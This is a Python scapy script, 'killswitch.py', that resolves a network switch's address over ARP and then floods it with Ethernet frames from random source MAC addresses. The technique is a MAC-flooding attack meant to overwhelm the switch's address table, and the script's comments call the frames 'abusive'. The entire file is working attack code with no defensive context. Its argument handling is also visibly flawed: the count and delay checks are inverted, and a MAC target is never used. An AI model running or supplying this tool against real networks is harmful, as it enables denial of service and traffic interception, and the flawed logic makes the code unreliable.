import time, sys, os, random
from scapy.all import ARP, Ether, srp, sendp

# killswitch.py

# confirm privilege
if os.geteuid() != 0:
    sys.exit('\r\nScript requires root elevation!\r\n')
    
# confirm cli-arg length
if len(sys.argv) != 5:
    sys.exit('\r\nUsage: <switch ip/mac> <iface> <frames|0=infinite> <delay m/s|0=none>\r\n')
    
targ_mac = ''

# if user specifies ip address
if '.' in sys.argv[1]:
    
    # resolve to mac via arp request
    try:  
        # send arp packet to broadcast address for response
        pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=sys.argv[1])
        
        # send / wait for replay
        result = srp(pkt, timeout=5, verbose=False)[0]
        
        # capture response
        for sent, received in result:
            targ_mac = received.hwsrc
            
    except Exception as err:
        sys.exit(err)
    
# timeout/bad-host
if not targ_mac:
    sys.exit('\r\nError! Could not resolve endpoint.\r\n')

flag = False
wait = False

# confirm packet count
if int(sys.argv[3]) == 0:
    flag = True

# confirm delay in milliseconds
if int(sys.argv[4]) == 0:
    wait = True
    
i = 0

while True:
    try:
        # increase counter
        i +=1
    
        # generate random source mac address
        src_mac = ':'.join(['%02x' % random.randint(0, 255) for _ in range(6)])
        
        # craft abusive ethernet frame
        frame = Ether(src=src_mac, dst=targ_mac)
    
        # deliver to switch
        sendp(frame, iface=sys.argv[2], verbose=False)
        
        print(f'[Frame #{i}] {src_mac} ----> {targ_mac}')
        
        if flag:
            # abort if packet cap reached
            if i >= int(sys.argv[3]):
                break
                
        if wait:
            # delay in m/s
            time.sleep(int(sys.argv[4]) / 1000)
            
    except KeyboardInterrupt:
        sys.exit('\r\nAborted.\r\n')
    except:
        pass
        
sys.exit('\r\nDone.\r\n')
